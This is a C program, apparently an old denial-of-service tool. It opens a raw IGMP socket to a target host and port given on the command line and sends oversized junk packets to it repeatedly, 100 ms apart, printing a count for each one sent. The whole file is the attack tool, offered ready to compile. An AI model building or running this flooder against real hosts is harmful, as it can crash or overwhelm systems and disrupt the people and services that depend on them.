#include <stdio.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char **argv)
{
        struct hostent          *pHostentry;
        struct sockaddr_in      sock;
        int                     explode,sd,times,x;
        char                    *tcp_dest;
        unsigned short          port;
        char                    big[20000];

        if ((argc < 5) || (argc > 5))
        {
                printf("usage: %s destination port size repititions\n",argv[0])
;
                exit(1);
        }

        tcp_dest = argv[1];
        port = atoi(argv[2]);
        explode = atoi(argv[3]);
        times = atoi(argv[4]);

        if ((pHostentry = gethostbyname(tcp_dest)) == NULL)
        {
                printf("Resolve of %s failed please try again.\n", argv[1]);
                exit(1);
        }

        memcpy(&sock.sin_addr.s_addr, pHostentry->h_addr, pHostentry->h_length)
;
        sock.sin_family = AF_INET;
        sock.sin_port = htons(port);

        if ((sd = socket(AF_INET, SOCK_RAW, 2)) == -1)
        {
                printf("Could not allocate socket.\n");
                exit(1);
        }

        if ( (connect(sd, (struct sockaddr *)&sock, sizeof (sock) )))
        {
                printf("Couldn't connect to host.\n");
                exit(1);
        }

        if ( send(sd, big, explode, 0) == -1)
        {
                printf("Error sending check size (lower)\n");
                close(sd);
                exit(1);
        }

        for (x = 0; x <= times; x++)
        {
                usleep(100000);
                if (send(sd, big, explode, 0) == -1)
                {
                        printf("Error sending.\n");
                        exit(1);
                }
                printf("Sent %s packet(%d)\n",argv[1], x);
        }
        close(sd);
        return 0;
}

